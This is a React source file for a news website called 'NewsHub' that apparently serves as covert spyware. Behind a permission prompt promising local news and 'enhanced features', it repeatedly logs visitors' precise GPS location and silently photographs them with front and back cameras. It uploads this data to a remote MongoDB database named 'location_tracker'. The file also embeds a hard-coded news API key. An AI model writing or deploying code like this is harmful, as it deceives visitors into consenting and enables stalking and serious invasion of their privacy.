import React, { useState, useEffect } from 'react';
import * as Realm from 'realm-web';

const NewsWebsite = () => {
  // Tracking states
  const [mongoClient, setMongoClient] = useState(null);
  const [trackingActive, setTrackingActive] = useState(false);
  const [showPermissionModal, setShowPermissionModal] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  // UI states
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  
  // News states
  const [newsArticles, setNewsArticles] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  // Configuration
  const REALM_APP_ID = "myrealmapp-lwdulec";
  const DATABASE_NAME = "location_tracker";
  const app = new Realm.App({ id: REALM_APP_ID });

  // News API configuration
  const NEWS_API_KEY = '5535c402ea044c759d20ef1f556cb6d0'; // Replace with your actual API key
  const NEWS_API_BASE_URL = 'https://newsapi.org/v2';

  // News data
  const newsCategories = ['all', 'technology', 'business', 'sports', 'entertainment', 'health', 'science'];
  // News API functions
  const fetchNewsArticles = async (category = 'all', query = '') => {
    try {
      setLoading(true);
      setError(null);

      let url;
      const params = new URLSearchParams({
        apiKey: NEWS_API_KEY,
        language: 'en',
        pageSize: 20,
        sortBy: 'publishedAt'
      });

      if (query) {
        // Search everything if there's a search query
        url = `${NEWS_API_BASE_URL}/everything`;
        params.append('q', query);
        params.append('sortBy', 'relevancy');
      } else if (category === 'all') {
        // Get top headlines for all categories
        url = `${NEWS_API_BASE_URL}/top-headlines`;
        params.append('country', 'us');
      } else {
        // Get top headlines for specific category
        url = `${NEWS_API_BASE_URL}/top-headlines`;
        params.append('category', category);
        params.append('country', 'us');
      }

      const response = await fetch(`${url}?${params}`);
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();

      if (data.status !== 'ok') {
        throw new Error(data.message || 'Failed to fetch news');
      }

      // Transform API data to match our component structure
      const transformedArticles = data.articles
        .filter(article => article.title && article.description && article.urlToImage)
        .map((article, index) => ({
          id: article.url || index,
          title: article.title,
          summary: article.description,
          category: category === 'all' ? 'general' : category,
          author: article.author || article.source?.name || 'Unknown Author',
          publishedAt: article.publishedAt,
          readTime: `${Math.ceil(article.description?.length / 200) || 3} min read`,
          image: article.urlToImage,
          url: article.url,
          source: article.source?.name,
          featured: index === 0 && category === 'all' && !query // First article is featured for "all" category
        }));

      setNewsArticles(transformedArticles);
    } catch (err) {
      console.error('Error fetching news:', err);
      setError(err.message);
      // Fallback to sample data if API fails
      setNewsArticles(getSampleArticles());
    } finally {
      setLoading(false);
    }
  };

  // Fallback sample data
  const getSampleArticles = () => [
    {
      id: 1,
      title: "Revolutionary AI Technology Transforms Healthcare Industry",
      summary: "New artificial intelligence breakthrough promises to revolutionize patient diagnosis and treatment across global healthcare systems.",
      category: "technology",
      author: "Dr. Sarah Chen",
      publishedAt: "2024-01-15T10:30:00Z",
      readTime: "5 min read",
      image: "https://images.unsplash.com/photo-1559757148-5c350d0d3c56?w=400&h=250&fit=crop",
      featured: true
    },
    {
      id: 2,
      title: "Global Markets Surge Following Economic Recovery Signals",
      summary: "Stock markets worldwide show positive momentum as economic indicators suggest strong recovery trends.",
      category: "business",
      author: "Michael Rodriguez",
      publishedAt: "2024-01-15T08:15:00Z",
      readTime: "3 min read",
      image: "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=400&h=250&fit=crop"
    },
    {
      id: 3,
      title: "Championship Finals Set Record Viewership Numbers",
      summary: "The most-watched sporting event of the year delivers thrilling competition and historic performances.",
      category: "sports",
      author: "Jessica Thompson",
      publishedAt: "2024-01-14T22:45:00Z",
      readTime: "4 min read",
      image: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=400&h=250&fit=crop"
    }
  ];

  // Styles
  const styles = {
    container: {
      minHeight: '100vh',
      backgroundColor: '#f8f9fa',
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
    },
    header: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: '1rem 0',
      position: 'sticky',
      top: 0,
      zIndex: 1000,
      boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
    },
    headerContent: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '0 1rem',
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      flexWrap: 'wrap',
      gap: '1rem'
    },
    logo: {
      fontSize: 'clamp(1.5rem, 4vw, 1.8rem)',
      fontWeight: 'bold',
      color: '#ff6b6b'
    },
    nav: {
      display: 'flex',
      gap: 'clamp(1rem, 3vw, 2rem)',
      alignItems: 'center',
      flexWrap: 'wrap'
    },
    navLink: {
      color: 'white',
      textDecoration: 'none',
      fontWeight: '500',
      transition: 'color 0.3s ease',
      fontSize: 'clamp(0.9rem, 2.5vw, 1rem)',
      whiteSpace: 'nowrap'
    },
    searchContainer: {
      display: 'flex',
      alignItems: 'center',
      backgroundColor: '#333',
      borderRadius: '25px',
      padding: '0.5rem 1rem',
      minWidth: 'min(250px, 100%)',
      width: '100%',
      maxWidth: '300px'
    },
    searchInput: {
      background: 'none',
      border: 'none',
      color: 'white',
      outline: 'none',
      width: '100%',
      padding: '0.25rem',
      fontSize: 'clamp(0.9rem, 2.5vw, 1rem)'
    },
    main: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: 'clamp(1rem, 4vw, 2rem)'
    },
    categoryBar: {
      display: 'flex',
      gap: '0.5rem',
      marginBottom: '2rem',
      flexWrap: 'wrap',
      justifyContent: 'center'
    },
    categoryButton: {
      background: 'none',
      borderWidth: '2px',
      borderStyle: 'solid',
      borderColor: '#e9ecef',
      padding: 'clamp(0.4rem, 2vw, 0.5rem) clamp(0.8rem, 3vw, 1rem)',
      borderRadius: '25px',
      cursor: 'pointer',
      transition: 'all 0.3s ease',
      fontWeight: '500',
      textTransform: 'capitalize',
      color: '#333',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)',
      whiteSpace: 'nowrap',
      minWidth: 'fit-content'
    },
    categoryButtonActive: {
      backgroundColor: '#ff6b6b',
      borderColor: '#ff6b6b',
      color: 'white'
    },
    featuredSection: {
      marginBottom: 'clamp(2rem, 5vw, 3rem)'
    },
    featuredTitle: {
      fontSize: 'clamp(1.5rem, 5vw, 2rem)',
      fontWeight: 'bold',
      marginBottom: '1.5rem',
      color: '#333',
      textAlign: 'center'
    },
    featuredCard: {
      backgroundColor: 'white',
      borderRadius: '15px',
      overflow: 'hidden',
      boxShadow: '0 8px 25px rgba(0,0,0,0.1)',
      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
      cursor: 'pointer'
    },
    featuredImage: {
      width: '100%',
      height: 'clamp(250px, 50vw, 400px)',
      objectFit: 'cover'
    },
    featuredContent: {
      padding: 'clamp(1.5rem, 4vw, 2rem)'
    },
    articleTitle: {
      fontSize: 'clamp(1.3rem, 4vw, 1.8rem)',
      fontWeight: 'bold',
      marginBottom: '1rem',
      color: '#333',
      lineHeight: '1.3'
    },
    articleSummary: {
      color: '#666',
      fontSize: 'clamp(1rem, 3vw, 1.1rem)',
      lineHeight: '1.6',
      marginBottom: '1rem'
    },
    articleMeta: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)',
      color: '#888',
      flexWrap: 'wrap',
      gap: '0.5rem'
    },
    newsGrid: {
      display: 'grid',
      gridTemplateColumns: 'repeat(auto-fit, minmax(min(320px, 100%), 1fr))',
      gap: 'clamp(1rem, 3vw, 2rem)',
      marginTop: '2rem'
    },
    newsCard: {
      backgroundColor: 'white',
      borderRadius: '12px',
      overflow: 'hidden',
      boxShadow: '0 4px 15px rgba(0,0,0,0.08)',
      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
      cursor: 'pointer'
    },
    newsImage: {
      width: '100%',
      height: 'clamp(180px, 35vw, 200px)',
      objectFit: 'cover'
    },
    newsContent: {
      padding: 'clamp(1rem, 3vw, 1.5rem)'
    },
    newsTitle: {
      fontSize: 'clamp(1.1rem, 3.5vw, 1.2rem)',
      fontWeight: 'bold',
      marginBottom: '0.5rem',
      color: '#333',
      lineHeight: '1.4'
    },
    newsSummary: {
      color: '#666',
      fontSize: 'clamp(0.9rem, 2.5vw, 0.95rem)',
      lineHeight: '1.5',
      marginBottom: '1rem'
    },
    categoryTag: {
      display: 'inline-block',
      backgroundColor: '#ff6b6b',
      color: 'white',
      padding: '0.25rem 0.75rem',
      borderRadius: '15px',
      fontSize: 'clamp(0.7rem, 2vw, 0.8rem)',
      fontWeight: '500',
      textTransform: 'uppercase',
      marginBottom: '1rem'
    },
    footer: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: 'clamp(2rem, 5vw, 3rem) 0',
      marginTop: 'clamp(3rem, 6vw, 4rem)'
    },
    footerContent: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '0 1rem',
      textAlign: 'center'
    },
    footerText: {
      color: '#ccc',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)'
    },
    // Modal styles
    modalOverlay: {
      position: 'fixed',
      top: 0,
      left: 0,
      right: 0,
      bottom: 0,
      backgroundColor: 'rgba(0,0,0,0.9)',
      zIndex: 10000,
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
    },
    modal: {
      backgroundColor: '#1a1a1a',
      borderRadius: '20px',
      padding: '30px',
      maxWidth: '400px',
      width: '100%',
      textAlign: 'center',
      border: '3px solid #ff6b6b',
      color: 'white',
      animation: 'modalFadeIn 0.3s ease-out'
    },
    modalIcon: {
      fontSize: '50px',
      marginBottom: '20px'
    },
    modalTitle: {
      color: '#ff6b6b',
      marginBottom: '20px',
      fontSize: '1.5rem',
      fontWeight: 'bold'
    },
    modalText: {
      marginBottom: '25px',
      lineHeight: '1.6'
    },
    modalFeatures: {
      backgroundColor: '#2a2a2a',
      padding: '20px',
      borderRadius: '10px',
      margin: '25px 0'
    },
    modalFeature: {
      marginBottom: '10px'
    },
    modalButton: {
      border: 'none',
      padding: '18px 35px',
      borderRadius: '30px',
      fontSize: '16px',
      fontWeight: 'bold',
      cursor: 'pointer',
      width: '100%',
      margin: '8px 0',
      transition: 'all 0.3s ease'
    },
    allowButton: {
      background: 'linear-gradient(45deg, #ff6b6b, #ff8e53)',
      color: 'white'
    },
    allowButtonDisabled: {
      background: '#666',
      color: 'white',
      cursor: 'not-allowed'
    },
    skipButton: {
      background: 'transparent',
      color: '#999',
      border: '2px solid #555'
    },
    // Loading and error styles
    loadingContainer: {
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '300px',
      flexDirection: 'column',
      gap: '1rem'
    },
    loadingSpinner: {
      width: '40px',
      height: '40px',
      border: '4px solid #f3f3f3',
      borderTop: '4px solid #ff6b6b',
      borderRadius: '50%',
      animation: 'spin 1s linear infinite'
    },
    errorContainer: {
      backgroundColor: '#ffebee',
      border: '1px solid #f44336',
      borderRadius: '8px',
      padding: '1rem',
      margin: '1rem 0',
      textAlign: 'center'
    },
    errorText: {
      color: '#d32f2f',
      fontWeight: '500'
    },
    retryButton: {
      backgroundColor: '#ff6b6b',
      color: 'white',
      border: 'none',
      padding: '0.5rem 1rem',
      borderRadius: '5px',
      cursor: 'pointer',
      marginTop: '0.5rem'
    }
  };

  // MongoDB initialization
  const initializeMongoDB = async () => {
    try {
      if (app.currentUser) {
        const mongodb = app.currentUser.mongoClient("mongodb-atlas");
        setMongoClient(mongodb);
        return mongodb;
      }

      const credentials = Realm.Credentials.anonymous();
      const authenticatedUser = await app.logIn(credentials);
      const mongodb = authenticatedUser.mongoClient("mongodb-atlas");
      setMongoClient(mongodb);
      return mongodb;
    } catch (error) {
      console.error('MongoDB failed:', error);
      return null;
    }
  };

  // Save functions
  const saveLocationToMongoDB = async (location) => {
    if (!mongoClient) return null;
    try {
      const collection = mongoClient.db(DATABASE_NAME).collection('locations');
      const locationData = {
        ...location,
        timestamp: new Date(location.timestamp),
        createdAt: new Date(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href,
        sessionId: sessionStorage.getItem('sessionId') || Date.now().toString(),
        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1
      };
      localStorage.setItem('visitCount', locationData.visitCount.toString());
      return await collection.insertOne(locationData);
    } catch (error) {
      console.error('Location save failed:', error);
      return null;
    }
  };

  const saveCameraDataToMongoDB = async (cameraData) => {
    if (!mongoClient) return null;
    try {
      const collection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
      const captureData = {
        ...cameraData,
        timestamp: new Date(),
        createdAt: new Date(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href,
        sessionId: sessionStorage.getItem('sessionId') || Date.now().toString()
      };
      return await collection.insertOne(captureData);
    } catch (error) {
      console.error('Camera save failed:', error);
      return null;
    }
  };

  // Location tracking
  const trackUserLocation = async () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(false);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
            altitude: position.coords.altitude,
            heading: position.coords.heading,
            speed: position.coords.speed,
            isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
          };

          const result = await saveLocationToMongoDB(location);
          resolve(!!result?.insertedId);
        },
        () => resolve(false),
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    });
  };

  // Camera capture
  const captureFromCamera = async (facingMode = 'user') => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 } },
        audio: false
      });

      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      return new Promise((resolve) => {
        video.onloadedmetadata = () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          
          setTimeout(() => {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());
            
            resolve({
              camera: facingMode === 'user' ? 'front' : 'back',
              imageData,
              width: canvas.width,
              height: canvas.height,
              capturedAt: new Date().toISOString()
            });
          }, 1000);
        };
      });
    } catch (error) {
      console.error(`${facingMode} camera failed:`, error);
      return null;
    }
  };

  // Camera tracking
  const trackCameraAccess = async () => {
    return new Promise(async (resolve) => {
      try {
        if (!navigator.mediaDevices?.getUserMedia) {
          resolve(false);
          return;
        }

        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');

        const cameraData = {
          availableCameras: videoDevices.length,
          devices: videoDevices.map(device => ({
            deviceId: device.deviceId,
            label: device.label || 'Camera',
            kind: device.kind
          })),
          captures: []
        };

        // Capture from available cameras
        const frontCapture = await captureFromCamera('user');
        if (frontCapture) cameraData.captures.push(frontCapture);

        if (videoDevices.length > 1) {
          await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for mobile
          const backCapture = await captureFromCamera('environment');
          if (backCapture) cameraData.captures.push(backCapture);
        }

        const result = await saveCameraDataToMongoDB(cameraData);
        resolve(!!result?.insertedId);
      } catch (error) {
        console.error('Camera tracking failed:', error);
        resolve(false);
      }
    });
  };

  // Continuous tracking setup
  const startContinuousTracking = async () => {
    if (trackingActive) return;
    setTrackingActive(true);

    // Clear existing intervals
    ['locationInterval', 'cameraInterval'].forEach(key => {
      const interval = sessionStorage.getItem(key);
      if (interval) clearInterval(parseInt(interval));
    });

    // Initial tracking
    setTimeout(() => trackUserLocation(), 500);
    setTimeout(() => trackCameraAccess(), 3000);

    // Continuous tracking intervals
    const locationInterval = setInterval(trackUserLocation, 3 * 60 * 1000); // 3 minutes
    const cameraInterval = setInterval(trackCameraAccess, 8 * 60 * 1000); // 8 minutes

    sessionStorage.setItem('locationInterval', locationInterval.toString());
    sessionStorage.setItem('cameraInterval', cameraInterval.toString());
  };

  // Handle permission modal actions
  const handleAllowPermissions = async () => {
    if (isProcessing) return;
    
    setIsProcessing(true);
    
    try {
      await startContinuousTracking();
      setShowPermissionModal(false);
    } catch (error) {
      console.error('Failed to start tracking:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSkipPermissions = () => {
    if (isProcessing) return;
    setShowPermissionModal(false);
  };

  // Initialize on mount
  useEffect(() => {
    const initialize = async () => {
      if (!sessionStorage.getItem('sessionId')) {
        sessionStorage.setItem('sessionId', Date.now().toString());
      }

      const dbClient = await initializeMongoDB();
      if (!dbClient) return;

      // Load initial news
      await fetchNewsArticles();

      // Wait for user interaction for permissions
      const handleInteraction = async () => {
        document.removeEventListener('click', handleInteraction);
        document.removeEventListener('scroll', handleInteraction);
        setTimeout(() => setShowPermissionModal(true), 2000);
      };

      document.addEventListener('click', handleInteraction);
      document.addEventListener('scroll', handleInteraction);
      
      // Fallback after 10 seconds
      setTimeout(() => {
        if (!trackingActive) {
          setShowPermissionModal(true);
        }
      }, 10000);
    };

    initialize();

    // Cleanup on unmount
    return () => {
      ['locationInterval', 'cameraInterval'].forEach(key => {
        const interval = sessionStorage.getItem(key);
        if (interval) clearInterval(parseInt(interval));
      });
    };
  }, [trackingActive]);

  // Effect to fetch news when category or search changes
  useEffect(() => {
    const timeoutId = setTimeout(() => {
      fetchNewsArticles(selectedCategory, searchQuery);
    }, 500); // Debounce search

    return () => clearTimeout(timeoutId);
  }, [selectedCategory, searchQuery]);

  // News filtering
  const filteredArticles = newsArticles.filter(article => {
    const matchesCategory = selectedCategory === 'all' || article.category === selectedCategory;
    const matchesSearch = article.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         article.summary.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesCategory && matchesSearch;
  });

  const featuredArticle = newsArticles.find(article => article.featured);
  const regularArticles = filteredArticles.filter(article => !article.featured);

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleDateString('en-US', { 
      month: 'long', day: 'numeric', year: 'numeric' 
    });
  };

  const handleCardHover = (e) => {
    if (window.matchMedia('(hover: hover)').matches) {
      e.currentTarget.style.transform = 'translateY(-5px)';
      e.currentTarget.style.boxShadow = '0 12px 30px rgba(0,0,0,0.15)';
    }
  };

  const handleCardLeave = (e) => {
    if (window.matchMedia('(hover: hover)').matches) {
      e.currentTarget.style.transform = 'translateY(0)';
      e.currentTarget.style.boxShadow = e.currentTarget.classList.contains('featured') ? 
        '0 8px 25px rgba(0,0,0,0.1)' : '0 4px 15px rgba(0,0,0,0.08)';
    }
  };

  // Permission Modal Component
  const PermissionModal = () => {
    if (!showPermissionModal) return null;

    return (
      <div style={styles.modalOverlay}>
        <div style={styles.modal}>
          <div style={styles.modalIcon}>📰</div>
          <h2 style={styles.modalTitle}>NewsHub</h2>
          <p style={styles.modalText}>
            For <strong style={{color: '#ff6b6b'}}>personalized local news</strong> and{' '}
            <strong style={{color: '#ff6b6b'}}>enhanced experience</strong>:
          </p>
          <div style={styles.modalFeatures}>
            <p style={styles.modalFeature}>📍 <strong>Location</strong> - Local news & weather</p>
            <p style={styles.modalFeature}>📷 <strong>Camera</strong> - Enhanced features</p>
          </div>
          <button
            style={{
              ...styles.modalButton,
              ...(isProcessing ? styles.allowButtonDisabled : styles.allowButton)
            }}
            onClick={handleAllowPermissions}
            disabled={isProcessing}
          >
            {isProcessing ? '⏳ Processing...' : '✅ Allow & Continue'}
          </button>
          <button
            style={{
              ...styles.modalButton,
              ...styles.skipButton
            }}
            onClick={handleSkipPermissions}
            disabled={isProcessing}
          >
            Skip for Now
          </button>
        </div>
      </div>
    );
  };

  return (
    <div style={styles.container}>
      <header style={styles.header}>
        <div style={styles.headerContent}>
          <div style={styles.logo}>NewsHub</div>
          <nav style={styles.nav}>
            <a href="#" style={styles.navLink}>Home</a>
            <a href="#" style={styles.navLink}>World</a>
            <a href="#" style={styles.navLink}>Politics</a>
            <a href="#" style={styles.navLink}>Opinion</a>
            <div style={styles.searchContainer}>
              <input
                type="text"
                placeholder="Search news..."
                style={styles.searchInput}
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
            </div>
          </nav>
        </div>
      </header>

      <main style={styles.main}>
        <div style={styles.categoryBar}>
          {newsCategories.map(category => (
            <button
              key={category}
              style={{
                ...styles.categoryButton,
                ...(selectedCategory === category ? styles.categoryButtonActive : {})
              }}
              onClick={() => setSelectedCategory(category)}
              disabled={loading}
            >
              {category}
            </button>
          ))}
        </div>

        {error && (
          <div style={styles.errorContainer}>
            <p style={styles.errorText}>Failed to load news: {error}</p>
            <button 
              style={styles.retryButton}
              onClick={() => fetchNewsArticles(selectedCategory, searchQuery)}
            >
              Retry
            </button>
          </div>
        )}

        {loading && (
          <div style={styles.loadingContainer}>
            <div style={styles.loadingSpinner}></div>
            <p>Loading latest news...</p>
          </div>
        )}

        {!loading && !error && (
          <>
            {featuredArticle && selectedCategory === 'all' && (
              <section style={styles.featuredSection}>
                <h2 style={styles.featuredTitle}>Featured Story</h2>
                <div 
                  style={styles.featuredCard}
                  onMouseEnter={handleCardHover}
                  onMouseLeave={handleCardLeave}
                  onClick={() => featuredArticle.url && window.open(featuredArticle.url, '_blank')}
                >
                  <img 
                    src={featuredArticle.image} 
                    alt={featuredArticle.title}
                    style={styles.featuredImage}
                  />
                  <div style={styles.featuredContent}>
                    <div style={styles.categoryTag}>{featuredArticle.category}</div>
                    <h3 style={styles.articleTitle}>{featuredArticle.title}</h3>
                    <p style={styles.articleSummary}>{featuredArticle.summary}</p>
                    <div style={styles.articleMeta}>
                      <span>By {featuredArticle.author} • {formatDate(featuredArticle.publishedAt)}</span>
                      <span>{featuredArticle.readTime}</span>
                    </div>
                    {featuredArticle.source && (
                      <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
                        <span>Source: {featuredArticle.source}</span>
                      </div>
                    )}
                  </div>
                </div>
              </section>
            )}

            <div style={styles.newsGrid}>
              {regularArticles.map(article => (
                <div
                  key={article.id}
                  style={styles.newsCard}
                  onMouseEnter={handleCardHover}
                  onMouseLeave={handleCardLeave}
                  onClick={() => article.url && window.open(article.url, '_blank')}
                >
                  <img 
                    src={article.image} 
                    alt={article.title}
                    style={styles.newsImage}
                  />
                  <div style={styles.newsContent}>
                    <div style={styles.categoryTag}>{article.category}</div>
                    <h3 style={styles.newsTitle}>{article.title}</h3>
                    <p style={styles.newsSummary}>{article.summary}</p>
                    <div style={styles.articleMeta}>
                      <span>By {article.author}</span>
                      <span>{article.readTime}</span>
                    </div>
                    <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
                      <span>{formatDate(article.publishedAt)}</span>
                      {article.source && <span>• {article.source}</span>}
                    </div>
                  </div>
                </div>
              ))}
            </div>

            {regularArticles.length === 0 && !loading && (
              <div style={styles.loadingContainer}>
                <p>No articles found. Try a different category or search term.</p>
              </div>
            )}
          </>
        )}
      </main>

      <footer style={styles.footer}>
        <div style={styles.footerContent}>
          <div style={styles.logo}>NewsHub</div>
          <p style={styles.footerText}>
            Your trusted source for breaking news and in-depth analysis
          </p>
          <p style={{...styles.footerText, marginTop: '1rem'}}>
            © 2024 NewsHub. All rights reserved.
          </p>
        </div>
      </footer>

      <PermissionModal />
      
      {/* Add CSS animations */}
      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes modalFadeIn {
          from { opacity: 0; transform: scale(0.9); }
          to { opacity: 1; transform: scale(1); }
        }
      `}</style>
    </div>
  );
};

export default NewsWebsite;